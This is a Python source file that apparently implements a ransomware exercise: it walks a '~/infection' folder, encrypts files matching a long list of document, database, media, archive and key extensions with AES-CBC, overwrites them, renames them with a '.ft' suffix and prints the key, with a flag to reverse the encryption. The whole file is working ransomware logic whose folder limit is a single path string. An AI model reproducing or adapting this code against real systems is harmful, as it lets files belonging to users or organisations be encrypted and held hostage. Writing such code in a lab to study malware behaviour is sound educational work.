import argparse
import hashlib
from sys import exit
import hmac
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

parser = argparse.ArgumentParser(description="Encrypt all files present in ~/infection")
parser.add_argument("-v", action="store_true", help="Print the version of the program")
parser.add_argument("-r", metavar="key", help="Reverse the encryption")
parser.add_argument("-s", action="store_true", help="Do not show encrypted files")
args = parser.parse_args()

if not args.r and not args.v:
	password = os.urandom(32)
extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']


def aes_encrypt(plaintext, key):
	iv = os.urandom(16)
	backend = default_backend()
	cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
	encryptor = cipher.encryptor()
	pad_length = 16 - (len(plaintext) % 16)
	padded_plain_text = plaintext + bytes([pad_length]) * pad_length
	ciphertext = iv + encryptor.update(padded_plain_text) + encryptor.finalize()
	hmac_key = key
	hmac_value = hmac.new(hmac_key, ciphertext, hashlib.sha256).digest()
	return hmac_value + ciphertext

def aes_decrypt(file, key):
	backend = default_backend()
	with open(file, 'rb') as f:
		hmac_value = f.read(32)
		ciphertext = f.read()
	hmac_key = key
	computed_hmac = hmac.new(hmac_key, ciphertext, hashlib.sha256).digest()
	if hmac.compare_digest(hmac_value, computed_hmac):
		iv = ciphertext[:16]
		actual_ciphertext = ciphertext[16:]
		cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
		decryptor = cipher.decryptor()
		padded_plaintext = decryptor.update(actual_ciphertext) + decryptor.finalize()
		pad_length = padded_plaintext[-1]
		plaintext = padded_plaintext[:-pad_length]
		
		return plaintext
	else:
		raise ValueError("Invalid key or corrupted ciphertext")

def encrypt():
	files = find_files(extensions)
	for file in files:
		try:
			with open(file, 'rb') as f:
				content = f.read()
			encrypted = aes_encrypt(content, password)
			if not encrypted:
				continue
			with open(file, 'wb') as f:
				f.write(encrypted)
			if not args.s:
				print(file)
			os.rename(file, file + '.ft')
		except Exception as e:
			print(e)


def decrypt(key):
	files = find_files((".ft"))
	for file in files:
		try:
			decrypted = aes_decrypt(file, bytes.fromhex(key))
			if not decrypted:
				continue
			with open(file, 'wb') as f:
				f.write(decrypted)
			if not args.s:
				print(file)
			os.rename(file, file[:-3])
		except Exception as e:
			print(f"Failed to decrypt {file}: {e}")

	
def find_files(extensions):
	found = []
	for root, dirnames, files in os.walk(home):
		for filename in files:
			if filename.endswith(tuple(extensions)):
				found.append(os.path.join(root, filename))
	return found


if args.v:
	print("Version 1.0")
else:
	if 'HOME' not in os.environ:
		print("Cannot find user HOME directory") 
		exit()
	home = os.environ['HOME'] + '/infection'
	if args.r:
		decrypt(args.r)
	elif not args.r:
		encrypt()
		print("Files encrypted with key: " + password.hex())
